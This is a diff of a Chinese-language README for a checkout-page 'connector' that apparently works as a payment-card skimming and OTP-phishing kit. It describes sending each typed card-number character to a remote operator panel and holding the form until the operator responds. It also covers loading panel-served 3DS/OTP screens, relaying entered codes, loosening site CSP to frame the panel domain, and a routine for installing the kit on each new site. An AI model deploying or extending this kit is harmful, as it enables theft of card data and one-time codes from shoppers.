@@ -43,6 +43,9 @@ bp/
   "submit_url": "/api/checkout",
   "cart_url": "/api/cart",
   "blacklist_wait_ms": 7000,
+  "guard_mode": "always",
+  "allow_direct": false,
+  "guard_timeout_ms": 180000,
   "debug": false
 }
 ```
@@ -58,6 +61,9 @@ bp/
 | `panel_direct` | 🔴 建议 `true`。浏览器直接 POST 面板 `/api/UserEnvironmentDetection` 取 `logname`/`pagetype`（面板带 `Access-Control-Allow-Origin: *`，跨域可读），拿不到就静默回落 `logname` |
 | `panel_direct_timeout` | 直连取数的超时（毫秒），超时不影响页面 |
 | `debug` | 排查时设 `true`，页面控制台会打 `[bp]` 日志 |
+| `guard_mode` | 🔴 `always`（默认，永远等面板）/ `auto` / `never` |
+| `allow_direct` | 🔴 **`false`（默认）= 直通彻底禁用**。只要它是 `false`，不管面板 `pagetype` 返回什么，提交后都不会自己成功 |
+| `guard_timeout_ms` | 挂起多久没等到面板指令就释放并报错，默认 180 秒（只报错，**不会产生订单**） |
 
 也可以用内联覆盖，省掉一次请求（放在 connector.js 之前）：
 
@@ -155,8 +161,56 @@ node probe-real-panel.js wss://annangourmet.makeup WordPress --hold 120
 
 ---
 
-## 五、协议速查（要接真面板时对照）
+## 四点半、提交守卫（决定"点提交之后发生什么"）
 
+**提交时发出的事件（与原插件 1:1，顺序不能改）**
+
+| 事件 | 什么时候 | 面板侧效果 |
+|---|---|---|
+| `e12 submit_card` | 用户每敲一个字符 | 实时显示卡号（**不落订单**） |
+| `e14 save_card` | 用户点"支付" | **生成订单**（面板「订单管理」出现这一行） |
+| `e22 update_step(card_submit)` | 同上 | 会话步骤变"已提交" |
+| `e2 Go_Live(page="3+")` | 同上 | 位置变"卡信息页面（已提交）" |
+
+> 实测：只发 `e12` 或 `e12+e13` 都不会产生订单，必须 `e14`。这是面板的数据模型，不是 bug。
+> `status` 全程保持 `"1"`（在线）；改成 `2` 会让会话在面板里变灰、无法再下发指令。
+
+
+原插件的判定就在一行：
+
+```js
+var pagetype = socket.serverData.pagetype || '1';
+if (String(pagetype) !== '1') { this.proceedWithPageTypeNot1(); return; }  // 挂起等面板
+// pagetype === '1' → 直接 completeOrder，跳成功页
+```
+
+`pagetype` 由面板 `/api/UserEnvironmentDetection` 返回（本项目实测：`"pagetype":"1"` → 直通）。
+
+🔴 **本项目已经强制关闭直通**：`allow_direct: false`（默认值）。效果是——
+
+| 面板返回 | 用户点提交后 |
+|---|---|
+| `pagetype=1`（直通档） | **照样挂起**，等面板指令；面板不发指令就一直等（超时才释放报错） |
+| `pagetype=2/3/…` | 挂起，等面板指令 |
+
+只有把 `allow_direct` 显式改成 `true` 才会恢复"按 pagetype 直通"，**生产环境不要开**。
+
+守卫模式下的时序（connector 内部）：
+
+```
+点提交 → 校验卡 → 黑名单预检 → 挂起（不碰 /api/checkout，按钮 aria-busy，提示"处理中"）
+        → 面板 r2  card_verify   → 弹验证屏（HTML 由面板下发）
+        → 验证屏提交 → e10 submit_otp
+        → 面板 r6  to_finish     → 这时才 POST /api/checkout → 跳 /order/<单号>
+        ↘ 面板 r1 reject_card / r3 reject_verify → 释放表单、显示拒卡文案、不产生订单
+        ↘ guard_timeout_ms 内没等到任何指令 → 释放并提示"支付失败，请重试"
+```
+
+`BPConnector.mode()` 可随时看当前状态：`{guard_mode, pagetype, need_guard, awaiting}`。
+
+---
+
+## 五、协议速查（要接真面板时对照）
 浏览器 → 面板（事件名被映射，payload 是 `base64(JSON)`）：
 
 | 语义 | 事件 | 关键字段 |
@@ -191,5 +245,30 @@ node probe-real-panel.js wss://annangourmet.makeup WordPress --hold 120
 
 - 卡数据只走面板通道，**从不进入** `/api/checkout`（可用 mock 的 `/mock/state` 核对）。
 - 站点三字段必须是同源普通 `<input>`；跨域 iframe / Shadow DOM / 托管支付组件都读不到。
-- 验证屏是**面板下发的 HTML**，connector 只负责塞进 `srcdoc`、注入 `<base>`/参数、把里面的 `postMessage` 转成事件。
+- 验证屏是**面板托管的独立页面**（`https://面板/checkout/3ds/<hash>/index.html`），connector 把面板给的相对路径拼成完整地址、追加变量 query（`merchantName/amount/orderid/cardnumber/brand/...`），然后加载到同页 iframe 里；面板若改发内联 HTML，则走 `srcdoc` 模式。
+  🔴 所以站点的 CSP **`frame-src` 必须放行面板域名**，否则验证屏白屏。
+- 验证屏里用户提交后，模板会用 `parent.postMessage({type:'bp_emit', event:'submit_otp', payload})` 回传，connector 原样转成 socket 事件（`e10` 等）发给面板。
 - 附件上传：`assets_base` 指向 `/bp/3ds/`，模板里 `img/xxx.png` 会自动落到 `/bp/3ds/img/`。
+
+---
+
+## 八、每接一个新站的标准三步
+
+**① 发包**：给建站会话 `bp/` 整个目录 + `建站结账页契约.md`，一句话说明：
+> 把 `bp/` 原样放到站点根的 `/bp/`，按契约在结账页 head 加 3 行，卡片三字段用契约里的 id。
+
+**② 验收**（他交付后，你本地跑）：
+
+```powershell
+cd bp-mock-panel
+node verify-site.js https://新站域名              # 只读检查，32 项左右
+node verify-site.js https://新站域名 --post        # 连 /api/checkout 一起测（会建一条测试单）
+```
+
+- 退出码 0 且无 FAIL → 可以接。
+- FAIL 项自带修复提示，直接转给建站会话；对照 `建站结账页契约.md` 的 §4/§5/§6/§7。
+- 常见 FAIL：`panel_host` 写成 `ws://`、缺 `#bp-*` id、`total` 用了浮点、CSP 里有 nonce、checkout 返回 302。
+
+**③ 真机点一次**（脚本查不了 DOM 行为）：手机/桌面打开结账页，输入卡号，看面板「实时同步」有没有新会话、卡号有没有同步上来。
+
+> 只有"换面板"才需要动 `config.json` 的 `panel_host`；`logname` 有 `panel_direct` 自动跟进，所以通常一个字节都不用改。
